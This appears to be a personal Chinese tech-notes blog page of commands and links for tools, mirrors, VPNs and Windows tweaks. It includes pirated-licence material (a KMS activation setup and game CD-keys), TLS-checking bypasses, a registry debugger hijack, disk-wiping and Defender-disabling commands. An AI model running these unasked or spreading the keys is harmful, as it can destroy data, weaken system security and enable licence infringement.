---
categories:
- Notes
date: 2016-02-08T21:08:50+08:00
title: Note
---

<!--more-->

> {{< image "/uploads/note.png" "Kratos" "1" "1" >}}

## 特殊符号
```java
特殊符号：
·⊙①◎Θ⊙●○¤㊣㈱＠の■□★☆◆◇◣◢◤◥▲△▼▽⊿◢▂▃▄▅▆▇█▉▊▋▌▍▎▏■□〓≡↑↓→←↘↙♀♂┇┅‖$@* amp;#※卍卐∞Ψ§∮№⌒＊◆◇◎●☉

标点符号：
．。，、；：？！ˉˇ¨`~々～‖∶＂＇｀｜·…—～-〃‘’“”〝〞〔〕〈〉《》「」『』〖〗【】（）［］｛｝︻︼﹄﹃

数学符号：
＋－×÷﹢﹣±／＝∥∠≌∽≦≧≒﹤﹥≈≡≠＝≤≥＜＞≮≯∷∶∫∮∝∞∧∨∑∏∪∩∈∵∴⊥∥∠⌒⊙√∟⊿㏒㏑％‰

单位符号：
㎎㎏㎜㎝㎞㎡㏄㏎㏑㏒㏕℡％‰℃℉°′″＄￡￥￠♂♀℅

数字序号：
①②③④⑤⑥⑦⑧⑨⑩㈠㈡㈢㈣㈤㈥㈦㈧㈨㈩№⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫⅰⅱⅲⅳⅴⅵⅶⅷⅸⅹ

希腊字母：
ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩαβγδεζνξοπρσηθικλμτυφχψω

占位符号：
一　一
一&#8195;一
一&#12288;一
https://en.m.wikipedia.org/wiki/Whitespace_character

✔️ ✔
✖️ ✖
❌
http://emojipedia.org/heavy-check-mark/
http://emojipedia.org/heavy-multiplication-x/
http://emojipedia.org/cross-mark/
```

## DOTA2
```java
启动：
-novid -console -high

控制台：
net_graph 1
dota_disable_range_finder 0
```

## 纯 UEFI 模式下转换 GPT 格式
```java
1. BIOS 设置中启动项关闭兼容模式
2. 插入 Win8 启动盘后，出现第一个"下一步"，按shift+f10调出命令对话框
3. 输入 diskpart
4. 输入 select  disk 0
5. 输入 clean
6. 输入 convert gpt

到这里就可以关闭命令对话框，按下一步进行正常的分区设置了，系统会自动分出三个区用于UEFI的启动。
```

## GPU & CPU 天梯表
```bash
http://malu.me/gpu/
http://malu.me/cpu/
```

## DNS
```bash
OpenDNS:
208.67.222.222
208.67.220.220

https://doh.pub/dns-query
https://doh.360.cn/dns-query
https://dns11.quad9.net/dns-query
```

## 磁盘分区空间量设置
```java
100 G：
100 * 1024 + 615 = 103015
```

## Git-GUI
```java
"D:\Download\PortableGit-MSysGit\bin\wish.exe D:/Download/PortableGit-MSysGit/libexec/git-core/git-gui"
```

## Clevo mirror
```bash
BIOS：
https://repo.palkeo.com/clevo-mirror/

DRIVERS：
https://www.sagernotebook.com/drivers.php?cat=580
```

## VPN
```bash
http://www.ipmana.com/

https://github.com/openconnect/openconnect
----
echo '123456' | sudo openconnect --juniper --background --syslog --passwd-on-stdin --script=/etc/vpnc/vpnc-script.in --user=123 --authgroup=教师组 https://sslvpn.fudan.edu.cn/

https://github.com/OpenVPN/openvpn
----
openvpn --config client13.ovpn --auth-user-pass 123.txt
----
username
userpass
```

## 无界
```bash
无界：
https://ultrasurf.us/index.html

自由：
https://dongtaiwang.com/loc/download.en.php

汇总：
https://forums.internetfreedom.org/index.php?wap2

Psiphon：
https://psiphon.ca/zh/download.html
https://psiphon3.com/zh/download.html

lantern：
https://getlantern.org
```

## 在线输入法（书签）
```bash
javascript:void(document.body.appendChild(document.createElement('script')).src='https://www.baidu.com/olime/bdime_open.js')
```

## Firefox
```bash
https://ftp.mozilla.org/pub/firefox/
https://download-origin.cdn.mozilla.net/pub/firefox/
https://download-installer.cdn.mozilla.net/pub/firefox/
```

## Server（Win）
```bash
Apache：
https://www.apachehaus.com/cgi-bin/download.plx

Nginx：
https://nginx.org/en/download.html

Caddy：
https://github.com/mholt/caddy/releases/latest

Serv-U：
https://support.solarwinds.com/Success_Center/Serv-U_Managed_File_Transfer_Serv-U_FTP_Server/release_notes
https://downloads.solarwinds.com/solarwinds/Release/SU/15.1.6/SU-FTP-Server-Windows-v15.1.6.zip
```

## 目录索引
```
Nginx：
nginx.exe -s reload
nginx.exe -s quit
----
http or server 中写入：
autoindex on;
autoindex_localtime on;
autoindex_exact_size off;
access_log off;
----
https://nginxconfig.io/

Caddy：
Caddy.exe -host 0.0.0.0 -port 80 "browse / ./1.txt" "gzip" "log stdout" "errors stdout" "header / -Server" "root ."
----
Browse Template：
https://github.com/mholt/caddy/blob/master/caddyhttp/browse/setup.go#L116
```

## 善用佳软
```bash
游览器：Chrome
播放器：MPC-BE
下载器：Aria2
清系统：CCleaner
解压缩：7-Zip
看图片：IrfanView
输入法：华宇拼音输入法
```

## Aria2 Curl Wget 代理下载
```html
Curl：
https://curl.haxx.se/download.html#Win64
curl -x socks5h://127.0.0.1:1080 www.baidu.com

curl -Oku XhstormR:123456 "sftp://127.0.0.1/d/download/123.txt"

curl -u "KEY:SECRET" --aws-sigv4 "aws:amz:us-west-004:s3" "https://xhstormr.s3.us-west-004.backblazeb2.com/123.txt"

Wget：
https://eternallybored.org/misc/wget/current/wget.exe
wget -e "http_proxy=10.34.3.71:808" www.baidu.com

Aria2：
https://github.com/aria2/aria2/releases/latest
aria2c --all-proxy="10.34.3.71:808" -s16 -x16 -k1M http://www.baidu.com/
```

## Wget 镜像网站
```bash
@ curl -so 123.html http://pdf7.tarena.com.cn/tts8_source/ttsPage/VIP/VIP_ESD00/index/mytts.html

@ busybox sed -i ^
-e "s/http:\/\/tts8.tmooc.cn\/ttsPage\//http:\/\/pdf7.tarena.com.cn\/tts8_source\/ttsPage\//g" ^
-e "s/\/EXERCISE\/01\/index.html/\/EXERCISE\/01\/index_answer.html/g" ^
123.html

@ wget ^
--mirror ^
--continue ^
--convert-links ^
--page-requisites ^
--adjust-extension ^
--no-parent ^
--no-verbose ^
--no-if-modified-since ^
--reject=js,css ^
--local-encoding=UTF-8 ^
--output-file=123.log ^
--directory-prefix=123 ^
--span-hosts --domains=pdf7.tarena.com.cn ^
--input-file=123.html --force-html

http://pdf7.tarena.com.cn/tts8_source/ttsPage/WEB/WEB_V05/index/mytts.html
http://pdf7.tarena.com.cn/tts8_source/ttsPage/EMBED/ESD_V05/index/mytts.html
http://pdf7.tarena.com.cn/tts8_source/ttsPage/LINUX/NSD_V05/index/mytts.html
http://pdf7.tarena.com.cn/tts8_source/ttsPage/JAVA/JSD_V05/index/mytts.html

https://www.gnu.org/software/wget/manual/wget.html
```

## Xshell & Xftp
```bash
Xshell：保持活动状态 -> 字符串 -> 0 \n
```

## Video Download
```html
youtube-dl：（FFmpeg 自动合并）
https://yt-dl.org/downloads/latest/
youtube-dl.exe --proxy socks5://127.0.0.1:1080 -F URL
youtube-dl.exe --proxy socks5://127.0.0.1:1080 -f 137+140 URL

you-get：
https://github.com/soimort/you-get/releases/latest

Bilibili：
http://www.bilibilijj.com/DownLoad/Cid/10143543

Andy's FLV Joiner：（FLV 合并）
http://www.videohelp.com/download/FLVJoin0.6.zip

yamdi：（FLV 关键帧）
https://sourceforge.net/projects/yamdi/files/
yamdi -i src.flv -o dst.flv

XML to ASS：（弹幕转字幕）
https://tiansh.github.io/us-danmaku/bilibili/
https://danmu2ass.codeplex.com/releases
```

## Chrome CSS
```css
正则排除网址：((?!localhost|xhstormr.tk).)*

a{text-decoration:none !important}
a:hover { text-decoration: underline !important;}
*:not([class*="icon"]):not(i){font-family: "Microsoft YaHei","Symbol" !important;}
```

## Chrome User Agent
```bash
iPhone：
--User-Agent="Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X; en-us) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53"

Android：
--User-Agent="Mozilla/5.0 (Linux; Android 5.1.1; Nexus 6 Build/LYZ28E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2403.20 Mobile Safari/537.36"

Windows：
--User-Agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2403.20 Safari/537.36 Linux Nexus"
```

## Chrome HSTS
```html
chrome://net-internals/#hsts

强制忽略证书错误：badidea
```

## Chrome Screenshot
```html
F12 -> Ctrl+Shift+P -> full size screenshot
```

## Search
```bash
https://duckduckgo.com/?q=123

https://www.google.com/search?newwindow=1&q=123

https://www.google.com/ncr
----
site:example.com filetype:pdf "电子书没有采用专有" -去除关键字
----
inurl:链接
intext:正文
intitle:标题
```

## Hosts
```bash
C:\Windows\System32\drivers\etc\
⇳
64.233.189.121 feeds.feedburner.com
64.233.189.121 www.repacks.org
64.233.189.121 www.draw.io
54.231.66.16 s3.amazonaws.com
209.99.20.16 dl.dumptruck.goldenfrog.com
151.101.128.133 blog.xhstormr.tk
151.101.128.133 assets-cdn.github.com
151.101.128.133 raw.githubusercontent.com
```

## GApps
```bash
https://www.apkmirror.com/apk/google-inc/google-services-framework/
https://www.apkmirror.com/apk/google-inc/google-play-services/
https://www.apkmirror.com/apk/google-inc/google-play-store/

https://github.com/MuntashirAkon/unapkm-android
https://github.com/opengapps/opengapps
```

## Google（Mirrors）
```html
https://raw.githubusercontent.com/googlehosts/hosts/master/hosts-files/hosts

EXE：
https://en.m.wikipedia.org/wiki/Google_Chrome
https://api.shuax.com/tools/getchrome
https://repo.fdzh.org/chrome/exe/
-
https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html
https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Android/523313/
https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/523309/
https://commondatastorage.googleapis.com/chromium-browser-snapshots/Android/LAST_CHANGE
https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/LAST_CHANGE
-
type nul > "D:\Program Files\Chrome\User Data\SwReporter"

CRX：
http://yurl.sinaapp.com/crx.php
http://chrome-extension-downloader.com/

APK：
https://apps.evozi.com/apk-downloader/
https://apkleecher.com/
https://m.apkpure.com/
https://www.apk4fun.com/
```

```bash
https://github.com/cnjackchen/my-chrome/blob/master/MyChrome.au3#L2680
https://github.com/google/omaha/blob/master/doc/ServerProtocolV3.md

curl -sk -X POST https://update.googleapis.com/service/update2 -T 123.txt
⬇️
type 123.txt | curl -sk https://update.googleapis.com/service/update2 -d @-
⬇️
curl -sk https://update.googleapis.com/service/update2 -d @- < 123.txt
⬇️
curl -sk https://update.googleapis.com/service/update2 -d @123.txt
⬇️
curl -sk https://update.googleapis.com/service/update2 -d @123.txt | xmllint --format -o 123.xml -

123.txt
⇳
<request protocol="3.0" installsource="update3web-ondemand">
  <os platform="win" version="10.0.14393.693" arch="x64"/>
  <app appid="{8A69D345-D564-463C-AFF1-A69D9E530F96}" ap="x64-stable-multi-chrome">
    <updatecheck/>
  </app>
  <app appid="{8A69D345-D564-463C-AFF1-A69D9E530F96}" ap="x64-beta-multi-chrome">
    <updatecheck/>
  </app>
  <app appid="{8A69D345-D564-463C-AFF1-A69D9E530F96}" ap="x64-dev-statsdef_1">
    <updatecheck/>
  </app>
</request>
```

```bash
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome\ExtensionInstallSources]
"1"="<all_urls>"
[HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome\ExtensionInstallWhitelist]
"1"="nihdlpmjaedafkmiicoadjdlggakghmh"
```

## Operating System（Mirrors）
```bash
MSDN：
https://msdn.itellyou.cn/
https://www.microsoft.com/zh-cn/software-download/windows10ISO
https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=56116
https://msdn.microsoft.com/zh-cn/library/ms123401.aspx
https://msdn.microsoft.com/zh-cn/subscriptions/downloads/
----
document.getElementById("DownloadsArea").style.display="";

Linux（CentOS）：
https://www.centos.org/download/
https://mirrors.cqu.edu.cn/
https://mirrors.sjtug.sjtu.edu.cn/
https://opentuna.cn/
https://mirrors.tuna.tsinghua.edu.cn/
https://mirrors.ustc.edu.cn/
https://mirrors.pku.edu.cn/Mirrors
https://mirror.azure.cn/
https://developer.aliyun.com/mirror/
https://mirrors.huaweicloud.com/
https://mirrors.tencent.com/
https://mirrors.163.com/
http://mirrors.hust.edu.cn/
http://mirror.bit.edu.cn/web/
http://mirrors.sohu.com/
http://mirrors.yun-idc.com/

RHEL：
https://access.redhat.com/products/red-hat-enterprise-linux/
https://developers.redhat.com/auth/realms/rhd/account/

https://docs.microsoft.com/zh-cn/sysinternals/downloads/
----
https://live.sysinternals.com/
https://download.sysinternals.com/files/SysinternalsSuite.zip

https://launcher.nirsoft.net/downloads/index.html

https://bellard.org/tcc/

https://www.vmware.com/go/getworkstation-win

https://releases.llvm.org/download.html
https://github.com/llvm/llvm-project/releases/latest
----
clang.exe --target=x86_64-pc-windows-gnu 123.c

https://prereleases.llvm.org/win-snapshots/clang-format-6923b0a7.exe

https://frippery.org/files/busybox/busybox64.exe

https://www.wireshark.org/download.html

https://zeroturnaround.com/software/jrebel/download/prev-releases/

https://www.cs.princeton.edu/~bwk/btl.mirror/index.html

https://github.com/Aegisub/Aegisub/releases/latest
https://www.nikse.dk/subtitleedit/online

https://jcenter.bintray.com/com/google/javascript/closure-compiler/v20180402/closure-compiler-v20180402.jar

https://free.nchc.org.tw/tdf/libreoffice/stable/6.0.1/win/x86_64/LibreOffice_6.0.1_Win_x64.msi

https://cloud.bluestacks.com/api/getdownloadnow
https://support.bluestacks.com/hc/en-us/sections/360006523831
----
https://repo.xposed.info/module/de.robv.android.xposed.installer
https://dl-xda.xposed.info/framework/
----
https://bstweaker.tk
https://play.google.com/store/apps/details?id=net.jolivier.cert.Importer
https://play.google.com/store/apps/details?id=org.proxydroid
https://www.proxifier.com/download/ProxifierPE.zip
https://github.com/Fuzion24/JustTrustMe
https://github.com/ViRb3/TrustMeAlready
----
"C:\Program Files\BlueStacks\HD-ConfigHttpProxy.exe" set 192.168.2.122 8080

https://mirrors.tuna.tsinghua.edu.cn/lyx/bin/
https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/tlnet/install-tl.zip

https://mirrors.tuna.tsinghua.edu.cn/virtualbox/virtualbox-Win-latest.exe

https://mirrors.ustc.edu.cn/vim/pc/vim82w32.zip

https://mirrors.ustc.edu.cn/kernel.org/linux/utils/boot/syslinux/syslinux-6.03.zip

https://mirrors.ustc.edu.cn/eclipse/technology/epp/downloads/release/oxygen/1a/eclipse-java-oxygen-1a-win32-x86_64.zip

https://mirrors.ustc.edu.cn/qtproject/official_releases/qtcreator/4.10/4.10.2/installer_source/windows_msvc2017_x64/qtcreator.7z

https://mirrors.ustc.edu.cn/gimp/stable/windows/gimp-2.10.0-x64-setup.exe

https://mirrors.ustc.edu.cn/kde/stable/krita/4.2.1/krita-x64-4.2.1.zip

https://mirrors.ustc.edu.cn/rust-static/dist/rust-1.51.0-x86_64-pc-windows-gnu.msi
https://mirrors.ustc.edu.cn/rust-static/dist/rustc-1.51.0-src.tar.gz

https://mirrors.ustc.edu.cn/golang/go1.16.2.windows-amd64.zip

https://mirrors.ustc.edu.cn/apache/maven/maven-3/3.5.3/binaries/apache-maven-3.5.3-bin.zip

https://mirrors.ustc.edu.cn/apache/tika/tika-app-1.23.jar
----
java -jar tika-app-1.19.1.jar -h 123 > 123.html

https://mirrors.tuna.tsinghua.edu.cn/lineage-rom/full/
----
https://download.lineageos.org/

https://rpm.nodesource.com/pub_16.x/el/8/x86_64/nodejs-16.0.0-1nodesource.x86_64.rpm
https://mirrors.huaweicloud.com/nodejs/latest/node-v16.0.0-win-x64.7z
https://cdn.npm.taobao.org/yarn/-/yarn-1.22.10.tgz
https://cdn.npm.taobao.org/primer-markdown/-/primer-markdown-4.0.0.tgz
----
https://registry.npm.taobao.org/
https://mirrors.huaweicloud.com/repository/npm/
----
yarn config set registry https://registry.npm.taobao.org
yarn global add test
----
npm --registry=https://registry.npm.taobao.org install -g test

https://mirror.azure.cn/nginx/download/nginx-1.20.0.zip

https://api.getfiddler.com/win/latest

https://www.ccleaner.com/ccleaner/builds

分词词典：
https://www.mdbg.net/chinese/dictionary?page=cc-cedict

世界地图：
https://planet.osm.org/
https://www.openstreetmap.org/

PSP：
https://www.ppsspp.org/downloads.html
https://github.com/hrydgard/ppsspp
https://buildbot.orphis.net/ppsspp/
----
模拟手柄：https://github.com/RetroPie/RetroPie-Docs/blob/master/docs/PSP-FuSa-gamepad.md

PS2：
http://pcsx2.net/download/releases/windows/category/40-windows.html
https://github.com/PCSX2/pcsx2
https://buildbot.orphis.net/pcsx2/

PS3：
https://rpcs3.net/download
https://github.com/RPCS3/rpcs3

PSV：
https://github.com/Vita3K/Vita3K

Xbox360：
https://github.com/xenia-project/xenia

N64：
http://www.pj64-emu.com/windows-downloads
https://github.com/project64/project64

Wii U：
http://cemu.info/index.html

3DS：
https://github.com/citra-emu/citra

Nintendo Switch：
https://github.com/yuzu-emu/yuzu
https://github.com/Ryujinx/Ryujinx

RetroArch:
https://github.com/libretro/RetroArch
```

## SQL
```bash
osquery：
https://github.com/facebook/osquery
----
select t1.*, t2.name from process_open_sockets t1, processes t2 where t1.pid = t2.pid order by t2.name;

SQLite：
https://www.sqlite.org/index.html
https://github.com/xerial/sqlite-jdbc
https://jcenter.bintray.com/org/xerial/sqlite-jdbc/
----
sqlite3.exe 123.db ".mode column" ".header on" "select * from user;" > 1.txt
----
compile 'org.xerial:sqlite-jdbc:+'

MySQL：
https://dev.mysql.com/downloads/mysql/
----
mysqld --initialize-insecure
mysqld
mysqladmin -uroot password 123456
mysql -uroot -p123456

Oracle：
http://www.oracle.com/technetwork/database/features/instant-client/index.html
----
sqlplus username/password@127.0.0.1:1521/cqsfjwdb
```

```sql
su - oracle
export ORACLE_HOME=/u01/oracle/product/11.2.0/db_1
export PATH=$PATH:$ORACLE_HOME/bin
sqlplus / as sysdba

CREATE USER admin
IDENTIFIED BY "123456"
DEFAULT TABLESPACE system;

GRANT
CONNECT,
RESOURCE,
CREATE SESSION,
DBA,
SYSDBA,
SYSOPER TO admin;

SELECT *
FROM SYS.USER$
WHERE NAME = 'ADMIN';

SELECT *
FROM SYS.DBA_USERS
WHERE USERNAME = 'ADMIN';
```

## FFmpeg
```bash
ffmpeg.exe -i http://example.com/1.m3u8 -c copy 123.mkv
ffplay.exe "http://example.com/1.m3u8"

ffplay.exe -v -8 -t 0.5 -loop 3 -nodisp -autoexit 123.mp3

H.264：
ffmpeg.exe -i 123.gif -c:v libx264 -preset medium -crf 28 -c:a aac -b:a 128k 123.mp4
H.265：
ffmpeg.exe -i 123.gif -c:v libx265 -preset medium -crf 28 -c:a aac -b:a 128k 123.mp4
VP9：
ffmpeg.exe -i 123.gif -c:v libvpx-vp9 -crf 45 -b:v 0 -c:a libvorbis 123.webm
H.264 to RAW：
ffmpeg.exe -i 123.mp4 -vcodec copy -an -bsf:v h264_mp4toannexb 123.h264
30 FPS：
ffmpeg.exe -i 123.mp4 -r 30 1234.mp4
Clip Video：
ffmpeg.exe -i 123.mp4 -ss 5.0 -t 3.0 1234.mp4
Watermark：
ffmpeg.exe -i 123.mp4 -vf "drawtext=fontfile=msyh.ttc:fontsize=18:fontcolor=white:text=By XhstormR:x=10:y=10" 1234.mp4
Capture Video：
ffmpeg.exe -f gdigrab -i desktop 123.mp4

https://ffmpeg.zeranoe.com/builds/
```

## Win10 禁用 OneDrive、Defender 等组件
```bash
gpedit.msc -> 计算机配置 -> 管理模板 -> Windows 组件 -> OneDrive & Windows Defender

卸载 OneDrive：
taskkill /f /im OneDrive.exe
%SystemRoot%\SysWOW64\OneDriveSetup.exe /uninstall
rd "%UserProfile%\OneDrive" /Q /S
rd "%LocalAppData%\Microsoft\OneDrive" /Q /S
rd "%ProgramData%\Microsoft OneDrive" /Q /S
rd "C:\OneDriveTemp" /Q /S
REG Delete "HKEY_CLASSES_ROOT\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /f
REG Delete "HKEY_CLASSES_ROOT\Wow6432Node\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /f

禁用 Unistack 服务组：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CDP* -> Start = 4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\OneSyncSvc* -> Start = 4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserDataSvc* -> Start = 4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UnistoreSvc* -> Start = 4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc* -> Start = 4
-
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc -> Start = 4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\tiledatamodelsvc -> Start = 4

CMD 操作示例：
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc /v Start /t REG_DWORD /d 4 /f
```

## Win10 输入法
```
切换半全角：Shift+Space
切换简繁体：Ctrl+Shift+F
```

## Domain
```bash
注册：https://my.freenom.com/
解析：https://www.cloudxns.net/
解析：https://www.cloudflare.com/a
解析：https://my.incapsula.com/mysites
```

## Pandoc
```bash
Markdown ➜ HTML：
pandoc -s -o 123.html --self-contained 123.md

Markdown ➜ PDF（需要 wkhtmltopdf）：
pandoc -s -o 123.pdf -c file:///D:/Download/123.css -f commonmark -t html5 ^
-V papersize:a4 ^
-M pagetitle:123 ^
-B 1.txt ^
-A 2.txt ^
123.md

123.css: primer-markdown
1.txt: <div class="markdown-body">
2.txt: </div>

https://github.com/jgm/pandoc
https://github.com/wkhtmltopdf/wkhtmltopdf
https://github.com/jgm/pandoc-templates/blob/master/default.html5
https://github.com/JetBrains/kotlin-web-site/blob/master/src/pdf.py
```

## Xpdf
```bash
pdftotext -layout -nopgbrk -enc UTF-8 123.pdf - | grep 123

https://www.xpdfreader.com/pdftotext-man.html
```

## ImageMagick
```html
magick.exe convert -size 1000 123.svg 123.png     svg ➜ png
magick.exe convert -density 300 123.pdf 123.png     pdf ➜ png
magick.exe convert -extent +0+10 -crop 0x2000 123.png 456.png     分割图片
magick.exe convert -transparent white -fuzz 25% 123.png 456.png     透明图片

https://www.imagemagick.org/script/download.php#windows
----
转换 PDF: https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/latest     将 gswin64c.exe 更名为 gs.exe
操作 PDF: https://github.com/coherentgraphics/cpdf-binaries
查看 PDF: https://mupdf.com/downloads/

https://pngquant.org/
http://advsys.net/ken/utils.htm
https://sourceforge.net/projects/optipng/files/OptiPNG/

https://tinify.cn/
http://m.2gei.com/bgremover/
https://imageoptim.com/mozjpeg

http://editor.method.ac/
http://127.0.0.1/draw/war/index.html?lang=zh&https=0&local=1&demo=1
```

## UTF-8 with BOM
```bash
(busybox printf "\xEF\xBB\xBF" & iconv -f UTF-16 -t UTF-8 123.txt) > 456.txt
```

## 回车和换行
```html
回车（CR）：\r
换行（LF）：\n

Unix：\n
Mac ：\r
Dos ：\r\n

FOR /R %G IN (*.md)  DO (unix2dos.exe -q "%G")
FOR /L %G IN (1,1,5) DO (type nul > %G.txt)

http://www.efgh.com/software/unix2dos.htm
https://waterlan.home.xs4all.nl/dos2unix.html
```

## 代码格式化
```html
FOR /R "D:\Download\code" %%i IN (*) DO (uncrustify.exe -c 123.cfg --no-backup "%%i")

http://astyle.sourceforge.net/
https://github.com/uncrustify/uncrustify

http://ww4.sinaimg.cn/large/a15b4afegy1fkfjyuhmvlj203k03kaor
```

## 修改环境变量
```bash
set
echo %PATH%

临时生效：
set  PATH=%PATH%;D:\Download\123
永久生效：
setx PATH "%PATH%;D:\Download\123" /m

----

cls
pause
start.
calc
SnippingTool
ping z.cn
doskey /history
date /t && time /t
fc /n /w /a 1.txt 2.txt
mstsc /admin
certutil -urlcache
certutil -hashfile 1.txt SHA1
busybox realpath 123.txt
```

## WebX
```html
https://storage.googleapis.com/downloads.webmproject.org/releases/webm/index.html
https://storage.googleapis.com/downloads.webmproject.org/releases/webp/index.html
```

## Translation
```html
https://cn.bing.com/translator
https://www.deepl.com/translator
https://translate.google.cn/m/translate

https://m.dict.cn/
https://dict.eudic.net/
https://dict.youdao.com/m
https://www.collinsdictionary.com/zh/

简繁转换：https://github.com/BYVoid/OpenCC
```

## Bilibili 专栏取消复制限制
```html
$(".article-holder").removeClass("unable-reprint");
$(".article-holder").off("copy");
```

## SumatraPDF
```html
TextColor = #a9b7c6
BackgroundColor = #2b2b2b
SelectionColor = #b3d4fc

https://www.sumatrapdfreader.org/settings.html
https://www.sumatrapdfreader.org/prerelease.html
```

## C
```html
C：
https://zh.m.wikipedia.org/zh-cn/C语言

https://en.wikibooks.org/wiki/C_Programming
https://code.google.com/archive/p/msys-cn/

https://zh.cppreference.com/w/c
http://www.cplusplus.com/reference/clibrary/
https://pubs.opengroup.org/onlinepubs/9699919799/idx/index.html
http://docwiki.embarcadero.com/RADStudio/Rio/en/C_Run-Time_Library_Reference
https://docs.microsoft.com/zh-cn/cpp/c-runtime-library/run-time-routines-by-category
https://docs.microsoft.com/zh-cn/cpp/c-language/organization-of-the-c-language-reference

CMake：
https://cmake.org/cmake/help/latest/

MFC：
https://docs.microsoft.com/zh-cn/cpp/mfc/mfc-desktop-applications

GCC：
https://gcc.gnu.org/onlinedocs/gcc/Option-Index.html

IDE：
https://www1.qt.io/offline-installers/#section-11
https://www.jetbrains.com/clion/download/
https://sourceforge.net/projects/orwelldevcpp/

Templates：
https://svn.code.sf.net/p/codeblocks/code/trunk/src/templates/
https://sourceforge.net/p/orwelldevcpp/code/ci/master/tree/Templates/

Linux Code:
https://elixir.bootlin.com/
```

## C\#（.NET Core）
```html
dotnet new console -n hello && cd hello
-----
dotnet publish -c abc
dotnet hello.dll
-----
dotnet publish -c abc -r win-x64
hello.exe

Core：
https://www.microsoft.com/net/download/windows
Framework：
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe

API：
https://docs.microsoft.com/zh-cn/dotnet/api/index?view=netframework-4.7
https://docs.microsoft.com/zh-cn/dotnet/api/system.math.sqrt?view=netframework-4.7
```

```cs
class Hello {
    public static void Main(string[] args) {
        System.Console.WriteLine("Hello World!");
        System.Console.ReadLine();
    }
}
```

## Office
```bash
多窗口切换：视图 -> 切换窗口
快捷键设置：选项 -> 自定义功能区 -> 键盘快捷方式 -> 视图选项卡 -> WindowList -> Alt+Shift+Q
```

### Excel
```bash
https://support.office.com/zh-cn/article/Excel-函数（按字母顺序）-b3944572-255d-4efb-bb96-c6d90033e188
https://support.office.com/zh-cn/article/面向-Windows-的-Excel-键盘快捷方式和功能键-1798d9d5-842a-42b8-9c99-9b7213f0040f
https://support.office.com/zh-cn/article/在相对引用、绝对引用和混合引用间切换-dfec08cd-ae65-4f56-839e-5f0d8d0baca9

F2     编辑
F4     切换引用类型
Ctrl+D     向下填充

拼接字符串：
="String"&A1&"String"
判断奇偶数：
=IF(MOD(A1,2),"奇数","偶数")
```

### Install
#### C2R（零售版）
```html
setup.exe /download 123.xml
setup.exe /configure 123.xml

https://config.office.com/
https://www.microsoft.com/en-us/download/confirmation.aspx?id=49117
https://support.office.com/zh-cn/article/d3879f0d-766c-469c-9440-0a9a2a905ca8
https://support.microsoft.com/zh-cn/help/257757
-----
PS：4 天死磕的教训，软件编程方面少跟 **微软的系统组件** 打交道，特别是关于注册表、DCOM、Office 之类的。
```

```xml
123.xml
⇳
<Configuration>
    <Add SourcePath="D:\Download\Office\" OfficeClientEdition="64" Channel="PerpetualVL2019">
        <Product ID="Word2019Volume">
            <Language ID="zh-cn"/>
        </Product>
        <Product ID="Excel2019Volume">
            <Language ID="zh-cn"/>
        </Product>
        <Product ID="PowerPoint2019Volume">
            <Language ID="zh-cn"/>
        </Product>
    </Add>
    <Updates Enabled="FALSE"/>
    <Display Level="Full" AcceptEULA="TRUE"/>
    <Logging Level="Standard" Path="D:\Download\Office\"/>
    <Property Name="AUTOACTIVATE" Value="1"/>
</Configuration>
```

#### MSI（批量授权版）
```bash
http://blog.sina.com.cn/s/blog_17b2ea0820102x7ds.html

FOR /R "%CD%\key" %%i IN (*.xrm-ms) DO (cscript.exe //Nologo "%Windir%\System32\slmgr.vbs" /ilc "%%i")
cscript.exe //Nologo "%CD%\Office16\OSPP.vbs" /inpkey:XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99
cscript.exe //Nologo "%CD%\Office16\OSPP.vbs" /sethst:kms.shuax.com
cscript.exe //Nologo "%CD%\Office16\OSPP.vbs" /act
cscript.exe //Nologo "%CD%\Office16\OSPP.vbs" /dstatus
```

## Replace Notepad
```bash
Install:
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v "Debugger" /t REG_SZ /d "\"%~dp0Notepad2.exe\" /z" /f
Uninstall:
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /f
```

## Photoshop
```
1. 仿制图章
2. 栅格化文字
3. 滤镜 -> 杂色 -> 添加杂色 -> 单色 30%
4. 滤镜 -> 模糊 -> 高斯模糊 -> 0.4
```

## Warcraft III CD-Key
```bash
   Reign of Chaos: K30EKC-XZ85-6FHWP5-QNY3-314OF6
The Frozen Throne: WGZPYW-V6CY-7P7JTR-YH4F-8ZH9PC
```

## Hacker
```bash
漏洞：
https://drops.tuisec.win/
https://paper.tuisec.win/

